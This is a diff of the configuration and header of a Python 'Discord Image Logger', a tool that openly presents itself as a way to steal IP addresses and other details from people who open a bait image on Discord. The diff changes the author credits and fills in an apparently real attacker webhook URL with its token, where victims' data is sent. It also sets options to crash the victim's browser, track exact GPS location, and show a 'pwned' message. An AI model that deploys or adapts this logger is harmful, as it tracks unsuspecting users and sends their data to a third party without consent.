@@ -1,5 +1,5 @@
 # Discord Image Logger
-# By MUDL | https://github.com/MUDL-AFK
+# By DeKrypt | https://github.com/dekrypted
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -7,13 +7,13 @@ import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v3.0"
-__author__ = "MUDL"
+__version__ = "v2.0"
+__author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1526331023351218248/sjXyCXjamQLAMtHL2mviKN-_6KTpaTp3i37EAScSyXhv2W4ReD3PInLR-wavTtiqhKA6",
-    "image": "https://pbs.twimg.com/media/HM4Li_KXoAEAMmU.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1526349587172954142/Zgucl6l_Ne5P105wdDkMEblw5NYgb-E1RpmxZ7Rp7nTF52NDH3ZmVbbf7D6oumWZmZt7",
+    "image": "https://cdn2.unrealengine.com/discord-2880x1620-8b18742c6a01.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -22,13 +22,13 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work.
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by FentTrolls Image Logger. https://github.com/MUDL-AFK/Discord-image-logger-PUBLIC", # Message to show
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -301,4 +301,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = app = ImageLoggerAPI
+handler = ImageLoggerAPI
